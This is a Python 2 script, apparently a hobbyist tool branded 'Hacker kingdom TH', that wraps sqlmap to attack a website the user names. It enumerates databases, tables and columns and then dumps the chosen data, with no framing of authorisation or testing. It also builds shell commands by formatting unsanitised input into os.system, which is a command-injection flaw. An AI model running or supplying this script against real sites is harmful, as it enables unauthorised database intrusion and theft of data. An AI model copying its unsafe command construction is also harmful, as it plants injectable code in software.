import sys, os, time
from time import sleep as timeout
#Banner
os.system("clear")
os.system("figlet Scansql")
print "Programing By Hacker kingdom TH"
print "YouTube : https://www.youtube.com/channel/UCx8iJxYxvk5MCpxI2biNGkQ"
print "Blog    : https://m.me/join/AbZob1niX6LP0Vxj"
print
#Hacker
web = raw_input("Target WebSite : ")
os.system("sqlmap -u %s --dbs"%(web))
data = raw_input("DataBase : ")
os.system("sqlmap -u %s -D %s --tables"%(web, data))
tables = raw_input("Tables : ")
os.system("sqlmap -u %s -D %s -T %s --columns"%(web, data,tables))
columns = raw_input("columns : ")
os.system("sqlmap -u %s -D %s -T %s -C %s --dump"%(web, data, tables, columns))
print "Hacking"
timeout(3)
print "<Thank you for using>"
print "\033[1m\033[32m Programing By Hacker kingdom TH"
print
print "\033[0m"
print
os.system("clear")
os.system("figlet Hacker kingdom TH")
print
print "\033[1m\033[32m Programing By Hacker kingdom TH"
print
print "\033[0m"
